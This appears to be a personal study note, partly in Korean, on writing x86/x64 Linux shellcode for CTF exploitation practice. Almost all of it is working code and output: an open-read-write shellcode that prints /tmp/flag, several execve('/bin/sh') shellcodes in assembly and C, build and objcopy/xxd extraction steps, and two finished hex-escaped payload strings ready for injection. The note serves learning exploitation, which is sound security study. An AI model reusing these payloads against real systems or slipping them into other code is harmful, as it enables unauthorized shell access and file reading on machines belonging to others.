orw shell
orw.s
```asm
;Name: orw.S

push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

orw.c
```c
// File name: orw.c
// Compile: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "push 0x67\n"
    "mov rax, 0x616c662f706d742f \n"
    "push rax\n"
    "mov rdi, rsp    # rdi = '/tmp/flag'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"
    "\n"
    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"
    "\n"
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)");

void run_sh();

int main() { run_sh(); }
```


run
```c
$ gcc -o orw orw.c -masm=intel
$ ./orw
flag{this_is_open_read_write_shellcode!}
```

```c
echo 'flag{this_is_open_read_write_shellcode!}' > /tmp/flag
```



syscall execve

| syscall | rax  | arg0 (rdi)          | arg1 (rsi)                 | arg2 (rdx)                 |
|----------|------|---------------------|----------------------------|----------------------------|
| execve   | 0x3b | const char *filename | const char *const *argv   | const char *const *envp   |

execve.s
```c
;Name: execve.S

mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```


execve.c
```c
// File name: execve.c
// Compile Option: gcc -o execve execve.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "mov rax, 0x68732f6e69622f\n"
    "push rax\n"
    "mov rdi, rsp  # rdi = '/bin/sh'\n"
    "xor rsi, rsi  # rsi = NULL\n"
    "xor rdx, rdx  # rdx = NULL\n"
    "mov rax, 0x3b # rax = sys_execve\n"
    "syscall       # execve('/bin/sh', null, null)\n"

    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c	# rax = sys_exit\n"
    "syscall        # exit(0)");

void run_sh();

int main() { run_sh(); }
```

run
```c
bash$ gcc -o execve execve.c -masm=intel
bash$ ./execve
sh$ id 
uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
```



shellcode.asm 32bit
```c
; File name: shellcode.asm
section .text
global _start
_start:
xor    eax, eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
xor    ecx, ecx
xor    edx, edx
mov    al, 0xb
int    0x80
```
shellcode.asm 64bit
```c
section .text
global _start

_start:
    xor rdx, rdx

    mov rbx, 0x68732f6e69622f
    push rbx

    mov rdi, rsp
    xor rsi, rsi

    mov rax, 59
    syscall
```

objdump로 shellcode.o 파일 얻기

```c
$ sudo apt-get install nasm 
$ nasm -f elf shellcode.asm
$ objdump -d shellcode.o
shellcode.o:     file format elf32-i386
Disassembly of section .text:
00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	31 c9                	xor    %ecx,%ecx
  11:	31 d2                	xor    %edx,%edx
  13:	b0 0b                	mov    $0xb,%al
  15:	cd 80                	int    $0x80
$ 
```


shellcode.bin
```c
$ objcopy --dump-section .text=shellcode.bin shellcode.o
$ xxd shellcode.bin
00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e331  1.Ph//shh/bin..1
00000010: c931 d2b0 0bcd 80                        .1.....
$
```

```c
# execve /bin/sh shellcode: 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```
이렇게 바이너리로 얻기가능




---

사실상
```c
BITS 64

section .text
global _start

_start:
    jmp short getstr

run:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    push 59
    pop rax
    syscall

getstr:
    call run
    db "/bin/sh", 0
```


```c
nasm -f elf64 shell.asm -o shellcode64.o
```
이걸로 우선 o 파일 뽑기

```c
objcopy --dump-section .text=shell.bin shell.o
```
bin 파일 만들기


```c
xxd -p shell.bin | tr -d '\n' | sed 's/../\\x&/g'
```
이걸로 파싱해서 뽑으면 payload 완성됨

```c
\xeb\x0c\x5f\x48\x31\xf6\x48\x31\xd2\x6a\x3b\x58\x0f\x05\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00
```
